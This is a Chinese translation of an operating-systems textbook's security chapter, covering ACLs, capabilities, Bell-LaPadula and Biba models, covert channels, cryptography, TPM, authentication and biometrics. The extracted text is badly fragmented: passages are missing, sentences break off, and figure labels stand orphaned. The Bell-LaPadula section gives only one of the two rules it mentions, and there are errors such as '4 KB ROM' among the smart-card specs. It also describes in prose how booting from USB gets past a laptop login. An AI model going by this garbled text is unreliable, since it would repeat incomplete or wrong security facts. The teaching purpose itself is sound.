请注意打印机1同时存在于两个域中，且在
域1
文件1[读] 文件2[读写]
域2 域3
文件1[读写] 文件4读写执行( 文件5[读写]
图9-3三个保护域
每个域中具有相同的权限。
文件1同样出现在两个域中，但它在两个域中却具有不同的权限。
任何时间，每个进程会在某个保护域中运行。
换句话说，进程可以访问某些对象的集合，每个对象 都有一个权限集。
进程运行时也可以在不同的域之间切换。
域切换的规则很大程度上与系统有关。
为了更详细地了解域，让我们来看看UNIX 系统(包括Linux 、FreeBSD 以及一些相似的系统)。
在 UNIX中，进程的域是由UID和GID定义的。
给定某个 (UID,GID) 的组合，就能够得到可以访问的所 有对象列表(文件，包括由特殊文件代表的I/O设备等),以及它们是否可以读、写或执行。
使用相同 (UID,GID) 组合的两个进程访问的是完全一致的对象集合。
使用不同 (UID,GID) 值的进程访问的 是不同的文件集合，虽然这些文件有大量的重叠。
而且，每个UNIX的进程有两个部分：用户部分和核心部分。
当执行系统调用时，进程从用户部分 切换到核心部分。
核心部分可以访问与用户部分不同的对象集。
例如，核心部分可以访问所有物理内存 的页面、整个磁盘和其他所有被保护的资源。
这样，系统调用就引发了域切换。
当进程把SETUID 或SETGID 位置于on 状态时可以对文件执行exec 操作，这时进程获得了新的有效 UID或GID。
不同的 (UID,GID) 组合会产生不同的文件和操作集。
使用SETUID 或SETGID 运行程序 也是一种域切换，因为可用的权限改变了。
一个很重要的问题是系统如何跟踪并确定哪个对象属于哪个域。
从概念来说，至少可以预想一个大矩 阵，矩阵的行代表域，列代表对象。
每个方块列出对象的域中包含的或可能有的权限。
图9-3的矩阵如图9- 4所示。
有了矩阵和当前的域编号，系统就能够判断是否可以从指定的域以特定的方式访问给定的对象。
域
1
2
3
对象
文件1 文件2 文件3 文件4 文件5 文件6 打印机1绘仪图2
图9-4 保护矩阵
域的自我切换在矩阵模型中能够很容易实现，可以通过使用操作enter 把域本身作为对象。
图9-5再 次显示了图9-4的矩阵，只不过把3个域当作了对象本身。
域1中的进程可以切换到域2中，但是一旦切换 后就不能返回。
这种切换方法是在UNIX里通过执行SETUID 程序实现的。
不允许其他的域切换。
对象
域
1
2
3
文 件 1 文 件 2 文 件 3 文件4 文件5 文件6打印机1 绘仪图2 域 1 域 2 域 3
图9-5 将域作为对象的保护矩阵
9.3.2 访问控制列表
在实际应用中，很少会存储如图9-5的矩阵，因为矩阵过大、过于稀疏。
大多数的域都不能访问大 多数的对象，所以存储一个维度极大却很稀疏的矩阵浪费空间。
但是也有两种方法是可行的。
一种是按 行或按列存放，而仅仅存放非空的元素。
这两种方法有着很大的不同。
这一节将介绍按列存放的方法， 下 一 节再介绍按行存放。
第一种方法包括一个关联于每个对象的(有序)列表，列表里包含了所有可访问对象的域以及这些 域如何访问这些对象的方法。
这一列表叫作访问控制列表 (Access Control List,ACL),如图9 - 6所示。
这里我们看到了三个进程，每一个都属于不同的域。
A 、B 和C以及三个文件F1 、F2 和F3。
为了简便，
图9-6 用访问控制列表管理文件的访问
我们假设每个域相当于某一个用户，即用户A 、B 和C 。
若用通常的安全性语言表达，用户被叫作主体 (subject 或principal), 以便与它们所拥有的对象(如文件)区分开来。
每个文件都有一个相关联的ACL 。
文件F1在ACL中有两个表项(用分号区分)。
第一个登录项表示 任何用户A拥有的进程都可以读写文件。
第二个表项表示任何用户B拥有的进程都可以读文件。
所有这 些用户的其他访问和其他用户的任何访问都被禁止。
请注意这里的权限是用户赋予的，而不是进程。
只 要系统运行了保护机制，用户A拥有的任何进程都能够读写文件F1。
系统并不在乎是否有1个还是100个 进程，所关心的是所有者而不是进程ID。
文件F2在ACL中有3个表项：A 、B 和C。
它们都可以读文件，而且B还可以写文件。
除此之外，不允 许其他的访问。
文件F3很明显是个可执行文件，因为B 和C 都可以读并执行它，B 还可以执行写操作。
这个例子展示了使用ACL进行保护的最基本形式。
在实际中运用的形式要复杂得多。
为了简便起见， 我们目前只介绍了3种权限：读、写和执行。
当然还有其他的权限。
有些是一般的权限，可以运用于所 有的对象，有些是对象特定的。
一般的权限有destory object和copy object。
这些可以运用于任何对象， 而不论对象的类型是什么。
与对象有关的特定权限包括针对邮箱对象的append message和针对目录对 象的sort alphabetically (按字母排序)等。
到目前为止，我们的ACL表项是针对个人用户的。
许多系统也支持用户组 (group) 的概念。
组可 以有自己的名字并包含在ACL 中。
在某些系统中，每个进程除了有用户ID(UID) 外，还有组ID(GID)。
在这类系统中，一个ACL表项包括了下列格式的条目：
UID1,GID1:rights1;UID2,GID2:rights2;..
在这样的条件下，当出现要求访问对象的请求时，必须使用调用者的UID和GID 来进行检查。
如果 它们出现在ACL中，所列出的权限就是可行的。
如果(UID,GID) 的组合不在列表中，访问就被拒绝。
使用组的方法就引入了角色(role) 的概念。
如在某次系统安装后，Tana 是系统管理员，在组里是
sysadm 。
但是假设公司里也有很多为员工组织的俱乐部， 而Tana是养鸽爱好者的一员。
俱乐部成员属于pigfan组并 可访问公司的计算机来管理鸽子的数据。
那么ACL中 的 一部分会如图9-7所示。
如果Tana想要访问这些文件，那么访问的成功与否
图9-7 两个访问控制列表
将取决于她当前所登录的组。
当她登录的时候，系统会让她选择想使用的组，或者提供不同的登录名和 密码来区分不同的组。
这一措施的目的在于阻止Tana 在使用养鸽爱好者组的时候获得密码文件。
只有当 她登录为系统管理员时才可以这么做。
在有些情况下，用户可以访问特定的文件而与当前登录的组无关。
这样的情况将引入通配符 (wildcard) 的概念，即“任何组”的意思。
如，表项
tana,:RW
会给Tana访问的权限而不管她的当前组是什么。
但是另一种可能是如果用户属于任何一个享有特定权限的组，访问就被允许。
这种方法的优点是， 属于多个组的用户不必在登录时指定组的名称，所有的组都被计算在内。
同时它的缺点是几乎没有提供 封装性：Tana可以在召开养鸽俱乐部会议时编辑密码文件。
组和通配符的使用使得系统有可能有选择地阻止用户访问某个文件。
如，表项
virgil,*:(none);*,:RW
给Virgil之外的所有用户以读写文件的权限。
上述方法是可行的，因为表项是按顺序扫描的，只要第一个 被采用，后续的表项就不需要再检查。
在第一个表项为Virgil找到了匹配，然后找到并应用这个存取权限， 在本例中为 (none) 。
整个查找在这时就中断了。
实际上，再也不去检查剩下的访问权限了。
还有一种处理组用户的方法，无须使用包含 (UID,GID) 对的ACL 表项，而是让每个表项成为
UID或GID。
如，针对文件pigeon_data的表项 debbie:RW;phil:RW;pigfan:RW
表示debbie 、phil以及其他所有pigfan组里的成员都可以读写该文件。
有时候也会发生这样的情况，即一个用户或组对特定文件有特定的权限，但文件的所有者稍后又想 收回。
通过访问控制列表，收回过去赋予的访问权相对比较简单。
这只要编辑ACL就可以修改了。
但是 如果ACL仅仅在打开某个文件时才会检查，那么改变它以后的结果就只有在将来调用open 命令时才能奏 效。
对于已经打开的文件，就会仍然持有原来打开时拥有的权限，即使用户已经不再具有这样的权限。
9.3.3 权能字
另一种切分图9-5矩阵的方法是按行存储。
在使用这种方法的时候，与每个进程关联的是可访问的 对象列表，以及每个对象上可执行操作的指示。
这一栏叫作权能字列表(capa bility list或C-list), 而 且 每个单独的项目叫作权能字 (Dennis 和Van Horn,1966;Fabry,1974)。
三个进程及其权能字列表如 图9- 8所示。
图9-8 在使用权能字时，每个进程都有一个权能字列表
每一个权能字赋予所有者针对特定对象的权限。
如在图9-8中，用户A所拥有的进程可以读文件F1 和F2。
一个权能字通常包含了文件(或者更一般的情况下是对象)的标识符和用于不同权限的位图。
在 类似UNIX的系统中，文件标识符可能是i节点号。
权能字列表本身也是对象，也可以从其他权能字列表 处指定，这样就有助于共享子域。
很明显权能字列表必须防止用户篡改。
已知的保护方法有三种。
第一种方法需要建立带标记的体系 结构 (tagged architecture),在这种硬件设计中，每个内存字必须拥有额外的(或标记)位来判断该字 是否包含了权限字。
标记位不能被算术、比较或相似的指令使用，它仅可以被在核心态下运行(即操作 系统)的程序修改。
人们已经构造了带标记的体系结构计算机，并可以稳定地运行(Feustal,1972)。
IBM AS/400就是一个公认的例子。
第二种方法是在操作系统里保存权能字列表。
随后根据权能字在列表中的位置引用权能字。
某个进 程也许会说：“从权能字2所指向的文件中读取1KB 。
” 这种寻址方法有些类似UNIX 里的文件描述符。
Hydra(Wulf 等人，1974)采用的就是这种方法。
生成并回送给用户如图9-9所示格 图9-9 采用了密码保护的权能字
式的权能字 。
除了特定的与对象相关的权限(如读和执行操作)外，权能字中(包括在核心态和密码保护模式下) 通常包含一些可用于所有对象的普通权限。
这些普通权限有：
1)复制权能字：为同一个对象创建新的权能字。
2)复制对象：用新的权能字创建对象的副本。
3)移除权能字：从权能字列表中删去表项；不影响对象。
4)销毁对象：永久性地移除对象和权能字。
最后值得说明的是，在核心管理的权能字系统中，撤回对对象的访问是十分困难的。
系统很难为任意 对象找到它所有显著的权能字并撤回，因为它们存储在磁盘各处的权能字列表中。
一种办法是把每个权能 字指向间接对象而不是对象本身，再把间接对象指向真正的对象，这样系统就能打断连接关系使权能字无 效。
(当指向间接对象的权能字后来出现在系统中时，用户将发现间接对象指向的是一个空的对象。
)
在Amoeba 系统结构中，撤回权能字是十分容易的。
要做的仅仅是改变存放在对象里的校验字段。
只要改变一次就可以使所有的失效。
但是没有一种机制可以有选择性地撤回权能字，如，仅撤回John的 许可权，但不撤回其他人的。
这一缺陷也被认为是权能字系统的一个主要问题。
另一个主要问题是确保合法权能字的拥有者不会给他最好的朋友1000个副本。
采用核心管理权 能字的模式，如Hydra 系统，这个问题得到解决。
但在如Amoeba 这样的分布式系统中却无法解决这 个问题。
总 之 ，ACL 和权能字具有一些彼此互补的特性。
权能字相对来说效率较高，因为进程在要求“打开 由权能字3所指向的文件”时无须任何检查；而采用ACL时需要进行搜索操作(时间可能很长),如果系 统不支持用户组的话，赋予每个用户读文件的权限就需要在ACL中列举所有的用户。
权能字还可以十分 容易地封装进程；而ACL却不能。
另一方面，ACL 支持有选择地撤回权限；而权能字不行。
最后，如果 对象被删除时权能字未被删除，或者权能字被删除时对象未被删除，问题就会发生；而ACL不会产生这 样的问题。
大部分用户对ACL比较熟悉，因为它们在操作系统(例如Windows 和UNIX) 中较为常见。
其实， 权能字也并不是不常见。
例如，运行在很多厂商(通常是基于其他的操作系统，如Android) 智能手机 上的L4内核是基于权能字的。
类似地，FreeBSD 中使用了Capsicum, 把权能字引入了UNIX家族。
9.4 安全系统的形式化模型
几 十 年 前 ，Harrison 等人(1976)在保护矩阵上确定了6种最基本的操作，这些操作可用作任何安 全系统模型的基准。
这些最基本的操作是create object、delete object、create domain、delete domain 、insert right和remove right。
最后的两种插入和删除权限操作来自于特定的矩阵单元，如赋予 域1读文件6的许可权。
上述6种操作可以合并为保护命令。
用户程序可以运行这些命令来改变保护矩阵。
它们不可以直接 执行最原始的操作。
例如，系统可能有一个创建新文件的命令，该命令首先查看该文件是否已存在，如 果不存在就创建新的对象并赋予所有者相应的权限。
当然也可能有一个命令允许所有者赋予系统中所有 用户读取该文件的权限。
实际上，只要在每个域中插入该文件的“读”权限项即可。
此刻，保护矩阵决定了在任何域中的一个进程可以执行哪些操作，而不是被授权执行哪些操作。
矩 阵是由系统控制的；而授权与管理策略有关。
为了说明其差别，我们看一看图9-10中域与用户相对应的 例子。
在图9-10a中，我们看到了既定的保护策略：Henry 可以读写Mailbox7,Robert 可以读写Secret, 所 有的用户可以读和执行Compiler。
Eric
Henry
Robert
对象
Compiler Mailbox7 Secret
a)
对象
Compiler Mailbox 7 Secret
图9-10 a)授权后的状态；b)未授权的状态
现在假设Robert 非常聪明，并找到了一种方法发出命令把保护矩阵改为如图9-10b所示。
现在他就 可以访问Mailbox7 了，这是他本来未被授权的。
如果他想读文件，操作系统就可以执行他的请求，因为 操作系统并不知道图9-10b的状态是未被授权的。
很明显，所有可能的矩阵被划分为两个独立的集合：所有处于授权状态的集合和所有未授权的集合。
大量理论研究提出这样一个问题：给定一个初始的授权状态和命令集，是否能证明系统永远不能达到未 授权的状态?
实际上，我们是在询问可行的安全机制(保护命令)是否足以强制某些安全策略。
给定了这些安全 策略、最初的矩阵状态和改变这些矩阵的命令集，我们希望可以找到建立安全系统的方法。
这样的证明 过程是非常困难的：许多一般用途的系统在理论上是不安全的。
Harrison 等人(1976)曾经证明在任意 保护系统的任意配置中，其安全性从理论上来说是不确定的。
但是对特定系统来说，有可能证明系统可 以从授权状态转移到未授权状态。
要获得更多的信息请看Landwehr(1981)。
9.4.1 多级安全
大多数操作系统允许个人用户来决定谁可以读写他们的文件和其他对象。
这一策略称为可自由支配 的访问控制 (discretionary access control)。
在许多环境下，这种模式工作很稳定，但也有些环境需要更 高级的安全，如军方、企业专利部门和医院。
在这类环境里，机构定义了有关谁可以看什么的规则，这 些规则是不能被士兵、律师或医生改变的，至少没有老板(或者老板的律师)的许可是不允许的。
这类 环境需要强制性的访问控制(mandatory access control)来确保所阐明的安全策略被系统强制执行，而 不是可自由支配的访问控制。
这些强制性的访问控制管理整个信息流，确保不会泄漏那些不应该泄漏的 信 息 。
1.Bell-LaPadula 模型
定为不同的密级。
如将军可能有权读取所有的文档，而中尉可能只被限制在秘密级或更低的文档。
代表 用户运行的进程具有该用户的安全密级。
由于该系统拥有多个安全等级，所以被称为多级安全系统。
Bell-LaPadula 模型对信息流做出了一些规定：
1) 简易安全规则：在密级k上面运行的进程只能读取同一密级或更低密级的对象。
例如，将军可以 读取中尉的文档，但中尉却不可以读取将军的文档。
简而言之，进程既可下读也可上写，但不能颠倒。
如果系统严格地执行上述两条规则，那么就不会有 信息从高一级的安全层泄露到低一级的安全层。
之所以用*代表这种规则是因为在最初的论文里，作者没有 想出更好的名字，所以只能用*临时替代。
但是最终作者也没有想出更好的名字，所以在打印论文时用了 *。
在这 一模型中，进程可以读写对象，但不能直接相互通信。
Bell-LaPadula 模型的图解如图9-11所示。
安全 级 别
符号说明
图9-11 Bell-LaPadula 多级安全模型
在图中，从对象到进程的(实线)箭头代该进程正在读取对象，也就是说，信息从对象流向进程。
同样，从进程到对象的(虚线)箭头代表进程正在写对象，也就是说，信息从进程流向对象。
这样所有 的信息流都沿着箭头方向流动。
例如，进程B可以从对象1读取信息但却不可以从对象3读取。
简易安全规则显示，所有的实线(读)箭头横向运动或向上；*规则显示，所有的虚线箭头(写) 也横向运行或向上。
既然信息流要么水平，要么垂直，那么任何从k层开始的信息都不可能出现在更低 的级别。
也就是说，没有路径可以让信息往下运行，这样就保证了模型的安全性。
Bell-LaPadula 模型涉及组织结构，但最终还是需要操作系统来强制执行。
实现上述模型的一种方式 是为每个用户分配一个安全级别，该安全级别与用户的认证信息(如UID和GID) 一起存储。
在用户登 录的时候，shell 获取用户的安全级别，且该安全级别会被shell 创建的所有子进程继承下去。
如果一个运 行在安全级别k之下的进程试图访问一个安全级别比k高的文件或对象，操作系统将会拒绝这个请求。
相 似地，任何试图对安全级别低于k的对象执行写操作的请求也一定会失败。
2.Biba 模型
Bell-LaPadula 模型的问题在于它可以用来保守机密，但不能保证数据的完整性。
要保证数据的完整 性，我们需要更精确的逆向特性 (Biba,1977)。
1)简单完整性规则：在安全等级k上运行的进程只能写同一等级或更低等级的对象(没有往上写)。
2)完整性*规则：在安全等级k上运行的进程只能读同一等级或更高等级的对象(不能向下读)。
这些规则联合在一起确保了程序员可以根据公司总裁的要求更新看门人的信息，但反过来不可以。
当然，有些机构想同时拥有Bell-LaPadula 和Biba 特性，但它们之间是矛盾的，所以很难同时满足。
9.4.2 隐蔽信道
所有的关于形式模型和可证明的安全系统听上去都十分有效，但是它们能否真正工作?
简单说来是 不可能的。
甚至在提供了合适安全模型并可以证明实现方法完全正确的系统里，仍然有可能发生安全泄 露。
本节将讨论已经严格证明在数学上泄露是不可能的系统中，信息是如何泄露的。
这些观点要归功于 Lampson(1973)。
进程
a)
b)
当然，隐蔽信道同时也是嘈杂的信道，包含了大量的外来信息。
但是通过纠错码(如汉明码或者更复 杂的代码)可以在这样嘈杂的信道中可靠地传递信息。
纠错码的使用使得带宽已经很低的隐蔽信道变得更 窄，但仍有可能泄露真实的信息。
很明显，没有一种基于对象矩阵和域的保护模式可以防止这种泄露。
锁定或解锁一个预置的文件，且S不是在一个特别嘈杂的信道里，并不需要十分精确的时序，除非
时 间 →
仅仅找到所有的隐蔽信道已经是非常困难的了，更不用说阻止它们了。
实际上，没有什么可行的方 法。
引入一个可随机产生页面调用错误的进程，或为了减少隐蔽信道的带宽而花费时间来降低系统性能 等，都不是什么诱人的好主意。
隐写术
另一类稍微不同的隐蔽信道能够在进程间传递机密信息，即使人为或自动的审查监视着进程间的所有信 息并禁止可疑的数据传递。
例如，假设一家公司人为地检查所有发自公司职员的电子邮件来确保没有机密泄 露给公司外的竞争对手或同谋。
雇员是否有办法在审查者的鼻子下面偷带出机密的信息呢?
结果是可能的， 同时也并不是很难做。
a) b)
图9-14 a) 三只斑马和一棵树；b) 三只斑马、一棵树以及五部莎士比亚完整的戏剧
9.5 密码学原理
我们将会深入讨论这些系统所使用的基本原语。
但是，对密码学的详细阐述超越了本书的范围。
不 过，许多优秀的书籍都详细讨论了这一话题，有兴趣的读者可以参考(如Kaufman 等人2002年的作品， 以及Gollman 于2011年出版的书籍)。
接下来，我们为不太熟悉密码学的读者做一个快速简介。
同样地，当D表示解密算法，Kp 表示解密密钥时，P=D(C,Kp) 。
也就是说，要想把密文还原成明文， 可以用密文C和解密密钥K,作为参数，通过解密算法D进行运算。
这两种互逆运算间的关系如图9-15所示。
图9-15明文和密文间的关系
明文：ABCDEFGHIJKLMN OPQRSTUVWXYZ
密 文 ：QWERTYUIOPASDFGHJKLZXCVBNM
从表面上看，这是一个安全的密钥机制，因为密码破译者虽然知道普通密钥机制(字母与字母间的 替换),但他并不知道26!
~4×10²⁶中哪一个是可能的密钥。
但是，给定一小段密文，这个密码还是能够 被轻易破译掉。
破译的基础在于利用了自然语言的统计特性。
在英语中，如e是最常用的字母，接下来是
t 、o 、a 、n 、i等。
最常用的双字母组合有th 、in 、er 、re等。
利用这类信息，破译该密码是较为容易的。
为了让大家感受 一 下公钥密码体制，请看下面两个问题：
问题1:314159265358979×314159265358979等于多少?
问题2:3912571506419387090594 828508241的平方根是多少?
9.5.3 单向函数
在接下来的许多情况下，我们将看到有些函数f, 其特性是给定f和参数x, 很容易计算出y=f(x)。
9.5.4 数字签名
通过对邮件或其他电子文档进行数字签名可以解决这类问题，并且保证了发送方日后不能抵赖。
其 中的一个通常使用的办法是首先对文档运行一种单向散列运算 (hashing), 这种运算几乎是不可逆的。
散列函数通常独立于原始文档长度产生一个固定长度的结果值。
最常用的散列函数有MD5(Message
对散列值运 算得到D
散列值 D(散列值)
a)
b)
图9-16 a)对签名块进行运算； b)接收方获取的信息
E(D(x))=x
D(E(x))=x
认证机构 (Certification Authority,CA) 作为可信的第三方，提供签名证书。
然而如果用户要验证 有CA签名的证书，就必须得到CA的公钥，从哪里得到这个公钥?
即使得到了用户又如何确定这的确是 CA的公钥呢?
为了解决上述两个问题，需要一套完整的机制来管理公钥，这套机制叫作PKI(Public
上面我们叙述了可用于数字证书的公钥密码体制。
同时，我们也有必要指出不包含公钥体制的密码 体系同样存在。
9.5.5 可信平台模块
TPM的出现引发了很多争议，因为不同厂商、机构对于谁来控制TPM 和它用来保护什么有分歧。
微软大力提倡采用TPM芯片，并且为此开发了一系列应用于TPM的技术，包括Palladium 、NGSCB 以及 BitLocker。
微软的观点是，由操作系统控制TPM芯片，并使用该芯片阻止非授权软件的运行。
“非授权 软件”可以是盗版(非法复制)软件或仅仅是没有经过操作系统认证的软件。
如果将TPM应用到系统启 动的过程中，则计算机只能启动经过内置于TPM的密钥签名的操作系统，该密钥由TPM生产商提供，该 密钥只会透露给允许被安装在该计算机上的操作系统的生产商(如微软)。
因此，使用TPM 可以限制用 户对软件的选择，用户或许只能选择经过计算机生产商授权的软件。
由于TPM 可以用于防止音乐与电影的盗版，这些媒体生产商对该芯片表现出了浓厚的兴趣。
TPM 同样开启了新的商业模式，如“租借”歌曲与电影。
TPM 通过检查日期判断当前媒体是否已经“过期”, 如果过期，则拒绝为该媒体解码。
一种有趣的TPM 使用方式是远程认证。
远程认证允许外部第三方使用TPM 进行计算机认证，并执 行其应该执行的软件，整个过程全部可信。
这个想法是证明方使用TPM 创建名为measurements 的保护配 置信息的哈希表。
例如，外部第三方除了BIOS 之外，不信任我方机器上的任何东西，如果(外部)挑
9.6 认证
每一个安全的计算机系统一定会要求所有的用户在登录的时候进行身份认证。
如果操作系统无法确 定当前使用该系统的用户的身份，则系统无法决定哪些文件和资源是该用户可以访问的。
表面上看认证 似乎是一个微不足道的话题，但它远比大多数人想象的要复杂。
决定如何认证是十分重要的，接下来的一步是找到一种好方法来实现它。
当人们试图登录系统时， 大多数用户登录的方法基于下列三个方面考虑：
1)用户已知的信息。
2)用户已有的信息。
3)用户是谁。
有些时候为了达到更高的安全性，需要同时满足上面的两个方面。
这些方面导致了不同的认证方案， 它们具有不同的复杂性和安全性。
我们将依次论述。
最广泛使用的认证方式是要求用户输入登录名和密码。
密码保护很容易理解，也很容易实施。
最简 单的实现方法是保存一张包含登录名和密码的列表。
登录时，通过查找登录名，得到相应的密码并与输 入的密码进行比较。
如果匹配，则允许登录，如果不匹配，登录被拒绝。
毫无疑问，在输入密码时，计算机不能显示被输入的字符以防在终端周围的好事之徒看到。
在 Windows系统中，将每一个输入的密码字符显示成星号。
在UNIX系统中，密码被输入时没有任何显示。
这两种认证方法是不同的。
Windows 也许会让健忘的人在输入密码时看看输进了几个字符，但也把密码 长度泄露给了“偷听者”。
(因为某种原因，英语有一个词汇专门表示偷听的意思，而不是表示偷窥，这 里不是嘀咕的意思，这个词在这里不适用。
)从安全角度来说，沉默是金。
a) b) c)
图9-17 a) 一个成功的登录；b) 输入登录名后被拒绝；c) 输入登录名和密码后被拒绝
大多数笔记本电脑在用户登录的时候要求一个用户名和密码来保护数据，以防止笔记本电脑失窃。
然而这种保护在有些时候却收效甚微，任何拿到笔记本的人都可以在计算机启动后迅速敲击DEL、F8 或 相关按键，并在受保护的操作系统启动前进入BIOS 配置程序，在这里计算机的启动顺序可以被改变， 使得通过USB端口启动的检测先于对从硬盘启动的检测。
计算机持有者此时插入安装有完整操作系统的 USB设备，计算机便会从USB中的操作系统启动，而不是本机硬盘上的操作系统启动。
计算机一旦启动 起来，其原有的硬盘则被挂起(在UNIX 操作系统中)或被映射为D盘驱动器(在Windows 中)。
因此， 绝大多数BIOS都允许用户设置密码以控制对BIOS配置程序的修改，在密码的保护下，只有计算机的真 正拥有者才可以修改计算机启动顺序。
如果读者拥有一台笔记本电脑，那么请先放下本书，先为BIOS 设置一个密码。
1.弱密码
这与2013年3月IOActive的研究人员所做的工作类似。
他们扫描了一大批家庭路由器和机顶盒，看 看他们是否容易受到最简单的攻击。
他们只是尝试众所周知的设备商默认的账号和密码。
用户应当立即 修改默认的账号和密码，但是他们没有。
研究人员发现，成千上万的设备存有潜在的被攻击的风险，更 可怕的是，西门子控制离心机的计算机的默认密码已经在互联网上传播了多年，但是仍被使用，Stuxnet 亦利用了cixinxi 来攻击伊朗的核设施。
这就回到了侏罗纪时代，计算机实际只需拨打所有260万个电话号码。
2.UNIX 密码安全性
日 在获得奥斯卡奖的科幻电影《侏罗纪公园I》中，一位名叫Dennis Nedry的计算机系统总设计师暗地里将由 计算机控制的保安系统全部关闭并逃离了主控室，以便窃取并带走恐龙的DNA。
另一位计算机技术人员面 对混乱的系统，对现场的其他人说，由于没有保存任何信息，所以要想恢复保安系统，只有一个一个地测 试，才能在总共200万个号码中将需要的号码找出来，一听是200万个号码，在场的人都泄了气。
作者在这 里调侃了电影《侏罗纪公园I》的创作者们，既然现场计算机系统还能工作，为什么不让计算机去拨打这些 号码呢!
——译者注
Morris 和Thompson 意识到存在这种攻击的可能性，于是便引入了一种几乎使攻击毫无效果的技巧。
这一技巧是将每一个密码同一个叫作盐 (salt) 的 n位随机数相关联。
无论何时只要密码改变，随机数就
3.一次性密码
很多管理员劝解他们的用户一个月换一次密码。
但用户常常不把这些忠告放在心上。
更换密码更极 端的方式是每次登录换一次密码，即使用一次性密码。
当用户使用一次性密码时，他们会拿出含有密码
列表的本子。
用户每一次登录都需要使用列表里的后一个密码。
如果入侵者万一发现了密码，对他也没
有任何好处，因为下一次登录就要使用新的密码。
唯一的建议是用户必须避免丢失密码本。
上述方法的算法基于单向函数，即y=f(x) 。
给定x我们很容易计算出y, 但是给定y却很难计算出x。
输入和输入必须是相同的长度，如256位。
用户选取一个他可以记住的保密密码。
该用户还要选择一个整数n, 该整数确定了算法所能够生成 的一次性密码的数量。
如果，考虑n=4, 当然实际上所使用的n值要大得多。
如果保密密码为s, 那么通 过单向函数计算n次得到的密码为：
P₁=f(f(f(f(s))))
第2个密码用单向函数运算n-1 次：
P₂=f(f(f(s)))
第3个密码对f 运算2次，第4个运算1次。
总之，P₁-1=f(P) 。
要注意的地方是，给定任何序列里的密码， 我们很容易计算出密码序列里的前一个值，但却不可能计算出后一个值。
如，给定P₂ 很容易计算出P₁, 但不可能计算出P₃。
4.挑战一响应认证
1)谁是Marjolein的姐妹?
2)你的小学在哪一条路上?
9.6.1 使用物理识别的认证方式
而芯片卡在卡片上包含了小型集成电路。
这种卡又可以被进一步分为两类：储值卡和智能卡。
储值卡 包含了一定数量的存贮单元(通常小于1KB), 它使用ROM技术保证数据在断电和离开读写设备后也能够 保持记忆。
不过在卡片上没有CPU, 所以被存储的信息只有外部的CPU (读卡器中)才能改变。
储值卡被 大量生产，使得每张成本可以低于1美元，如电话预付费卡等。
当人们打电话时，卡里的电话费被扣除，但 实际上并没有发生资金的转移。
由于这个原因，这类卡仅仅由一家公司发售并只能用于一种读卡器(如电 话机或自动售货机)。
当然也可以存储1KB信息的密码并通过读卡机发送到主机验证，但很少有人这么做。
近来拥有更安全特性的是智能卡。
智能卡通常使用4MHz 8位CPU,16KB ROM,4 KB ROM,512B可 擦写RAM以及9600b/s与读卡器之间的通信速率。
这类卡制作越来越小巧，但各种参数却不尽相同。
这
些参数包括芯片深度(因为嵌入在卡片里)、芯片宽度(当用户弯折卡时芯片不会受损)和成本(通常 从1美元到20美元一张不等，取决于CPU功率、存储大小以及是否有密码协处理器)。
图9-19 使用智能卡的认证
e 飞行里数卡是信用卡的一种，通过这类信用卡结账时，可以将消费的金额换算成航班的飞行里数，消费到 一定金额时，可能兑换免费机票。
——译者注
9.6.2 使用生物识别的认证方式
第三种方法是对用户的某些物理特征进行验证，并且这些特征很难伪造。
这种方法叫作生物识别 (Pankanti 等人，2000)。
如接通在电脑上的指纹或声音识别器可以对用户身份进行校验。
一个典型的生物识别系统由两部分组成：注册部分和识别部分。
在注册部分中，用户的特征被数字 化储存，并把最重要的识别信息抽取后存放在用户记录中。
存放方式可以是中心数据库(如用于远程计 算机登录的数据库)或用户随身携带的智能卡并在识别时插入远程读卡器(如ATM机)。
被选用的识别特征必须有足够的可变性，这样系统可以准确无误地区分大量的用户。
例如，头发颜 色就不是一个好的特征，因为许多人都拥有相同颜色的头发。
而且，被选用的特征不应该经常发生变化 (对于一些人而言，头发并不具有这个特性)。
例如，人的声音由于感冒会变化，而人的脸会由于留胡子 或化妆而与注册时的样本不同。
既然样本信息永远也不会与以后识别到的信息完全符合，那么系统设计 人员就要决定识别的精度有多大。
在极端情况下，设计人员必须考虑系统也许不得不偶尔拒绝一个合法 用户，但恰巧让一个乔装打扮者进入系统。
对电子商务网站来说，拒绝一名合法用户比遭受一小部分诈 骗的损失要严重得多；而对核武器网站来说，拒绝正式员工的到访比让陌生人一年进入几回要好得多。
现在让我们来看一看实际应用的一些生物识别方式。
一个令人有些惊奇的方式是使用手指长短进行 识别。
在使用该方法时，每一个终端都有如图9-20所示的装置。
用户把手插进装置里，系统就会对手指的长短进行测量并与数据 库里的样本进行核对。
然而，手指长度识别并不是令人满意的方式。
系统可能遭 受手指石膏模型或其他仿制品的攻击，也许入侵者还可以调节 手指的长度以便进行实验。
结果在用户登录的时候与现场采样结果进行比较，如果两者的 图9-20 一种测量手指长度的装置 汉明距离 (hamming distance) 小于某个阈值，则该用户通过验
证(两个比特字串之间的汉明距离指从一个比特串变换为另一个比特串最少需要变化的比特数)。
我们可以继续给出许多例子，但是有两个例子特别有助于我们理解。
猫和其他一些动物通过小便来 划定自己的地盘。
很明显，猫通过这种方法可以相互识别自己的家。
假设某人拿着一个可以进行尿液分 析的装置，那么他就可以建立识别样本。
每个终端都可以有这样的装置，装置前放着一条标语：“要登 录系统，请留下样本。
”这也许是一个绝对无法攻破的系统，但用户可能难以接受使用这样的系统。
安 全 361
如果本书的早期版本中出现了上述段落的内容，它可能会被当成笑话，而如今这已不是笑谈。
在生 活模仿艺术(或者说生活模仿教科书?
)的例子中，研究人员现在已经开发出可以用作生物特征的气味 识别系统 (Rodriguez-Lujan 等人，2013)。
下一步是气味视觉混合识别 (Smell-O-Vision) 吗 ?
在使用指纹识别装置和小型谱仪时也可能发生同样的潜在情况。
用户会被要求按下大拇指并抽取一 滴血进行化验分析。
到目前为止没人发表过相关材料，但是有将血管成像作为生物特征的研究 (Fuksis 等人，2011)。
我们的观点是任何身份验证方案必须是用户心理上可以接受的。
测量手指长度可能不会造成任何问 题，但是像线上存储指纹这种东西(即使是非侵入性的)对许多人来说可能就是不可接受的，因为它们 将指纹与犯罪分子相关联。
不过，苹果在iPhone 5S上推出了这项技术。
9.7 软件漏洞
由于本书是一本关于操作系统的书，关注点是恶意应用如何破坏操作系统，因此许多利用软件漏洞 攻击网站和数据库的方法不属于本书关心的范畴。
一个典型的例子是有人发现操作系统中的一个漏洞， 然后利用它运行有错误的代码来损坏计算机。
强迫下载并不完全属于这种情形，但是利用程序中的漏洞 而进行攻击的方法在内核中也是常见的。
